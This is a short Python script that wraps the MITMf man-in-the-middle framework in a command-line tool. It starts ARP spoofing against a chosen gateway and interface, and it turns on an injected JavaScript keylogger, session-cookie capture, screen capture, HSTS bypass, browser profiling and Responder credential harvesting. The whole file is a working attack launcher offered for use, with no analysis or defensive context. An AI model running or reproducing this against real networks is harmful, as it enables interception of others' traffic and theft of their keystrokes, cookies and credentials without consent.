#!/usr/bin/python3

import fire, os

class MiTM(object):
	def start(self, gateway="192.168.0.1", iface="wlan0"):
		cmd = "mitmf --ferretng --screen --jskeylogger --hsts \
			--browserprofiler --responder --spoof --arp \
			--gateway %s -i %s" % (gateway,iface)
		a = os.system(cmd)
		exit(a)

if __name__ == "__main__":
	fire.Fire(MiTM)
